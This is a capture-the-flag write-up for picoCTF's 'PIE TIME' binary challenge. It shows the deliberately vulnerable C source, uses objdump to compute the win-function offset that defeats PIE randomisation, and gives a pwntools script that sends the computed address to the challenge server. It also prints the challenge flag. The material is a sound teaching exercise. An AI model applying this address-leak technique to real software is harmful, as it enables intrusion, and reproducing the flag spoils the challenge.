# PIE TIME

![image.png](images/image.png)

After launching the instance, we can download a binary vuln and its source code vuln.c

Here is how the vuln.c looks like:

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void segfault_handler() {
  printf("Segfault Occurred, incorrect address.\n");
  exit(0);
}

int win() { // Win function that we want to access
  FILE *fptr;
  char c;

  printf("You won!\n");
  // Open file
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL)
  {
      printf("Cannot open file.\n");
      exit(0);
  }

  // Read contents from file
  c = fgetc(fptr);
  while (c != EOF)
  {
      printf ("%c", c);
      c = fgetc(fptr);
  }

  printf("\n");
  fclose(fptr);
}

int main() {
  signal(SIGSEGV, segfault_handler);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  printf("Address of main: %p\n", &main); // Print the main address

  unsigned long val;
  printf("Enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);
  printf("Your input: %lx\n", val);

  void (*foo)(void) = (void (*)())val;
  foo();
}
```

 

Using objdump to disassemble, we can find the offset of the win and main function:

```c
└─$ objdump -D vuln|grep -E 'win|main'
    11c1:       48 8d 3d 75 01 00 00    lea    0x175(%rip),%rdi        # 133d <main>
    11c8:       ff 15 12 2e 00 00       call   *0x2e12(%rip)        # 3fe0 <__libc_start_main@GLIBC_2.2.5>
00000000000012a7 <win>:
    12db:       75 16                   jne    12f3 <win+0x4c>
    1302:       eb 1a                   jmp    131e <win+0x77>
    1322:       75 e0                   jne    1304 <win+0x5d>
000000000000133d <main>:
    1387:       48 8d 35 af ff ff ff    lea    -0x51(%rip),%rsi        # 133d <main>
    1400:       74 05                   je     1407 <main+0xca>

```

Using lddhttps://man7.org/linux/man-pages/man1/ldd.1.html to check the shared dependencies, we can find that the addresses varies every time it execute 

```c
└─$ ldd vuln
        linux-vdso.so.1 (0x00007f65a3da2000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f65a3b89000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f65a3da4000)

└─$ ldd vuln                                                                                                                                                                                                                               
        linux-vdso.so.1 (0x00007f3de7a67000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3de784e000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f3de7a69000)
        
└─$ ldd vuln                                                                                                                                                                                                                               
        linux-vdso.so.1 (0x00007fb680c5d000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb680a44000)
        /lib64/ld-linux-x86-64.so.2 (0x00007fb680c5f000)
```

We can get more hints using the file command

```c
└─$ file vuln
vuln: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0072413e1b5a0613219f45518ded05fc685b680a, for GNU/Linux 3.2.0, not stripped

```

We can see the word pie. To read more about PIE(Position Independent Executable), please refer to this article https://ir0nstone.gitbook.io/notes/binexp/stack/pie

In simple words, it randomize the addresses so that it is harder for the the attacker to do the attack.

To find the address of the win function during every function, we need to know the address, then calculate the win address using the difference in offset.

Luckily, we are given the main address every time we execute. Therefore we need to calculate the difference. We can use python for the calculation:

```c
>>> 0x133d-0x12a7
150
>>> hex(150)
'0x96'
```

To test locally, we can first execute the binary

```c
└─$ ./vuln 
Address of main: 0x563ed28d933d
Enter the address to jump to, ex => 0x12345: 

```

Then can subtract the difference

```c
>>> hex(0x563ed28d933d-0x96)
'0x563ed28d92a7'
```

Finally enter the answer

```c
└─$ ./vuln 
Address of main: 0x563ed28d933d
Enter the address to jump to, ex => 0x12345: 0x563ed28d92a7
Your input: 563ed28d92a7
You won!
Cannot open file.
```

Now we can connect to get flag, just following the above steps and you can calculate the correct address.

We can also write a python script, so we can get the correct win address every time without manual calculation

There is a module called pwntoolshttps://nobinpegasus.github.io/blog/a-beginners-guide-to-pwntools/, which allows us to receive data and send payload to remote instances.

it can be installed by `pip install pwntools`

```bash
from pwn import *

port=int(input('Please enter the port number: '))
nc=connect('rescued-float.picoctf.net', port) 

nc.recvuntil(b':') #Ignoring until the first ':'
address=nc.readline().decode() # Obtain the main address which is in the same line
print(f'The main address is {address}')

win=hex(int(address, 16) - 0x96).encode() #Convert the address to int first or else it will become str - int. Then we encode it by adding b' and front and ' and the back
print(f'The win address is {win}')

nc.sendlineafter(b':',win) #Send the payload after the second ':' appears

nc.interactive() #Switch to interactive mode
```

After entering the port, you should get the flag

```jsx
The main address is  0x641a768ee33d

The win address is b'0x641a768ee2a7'
[*] Switching to interactive mode
 Your input: 641a768ee2a7
You won!
picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_6f4e7236}
```

Flag: `picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_6f4e7236}`
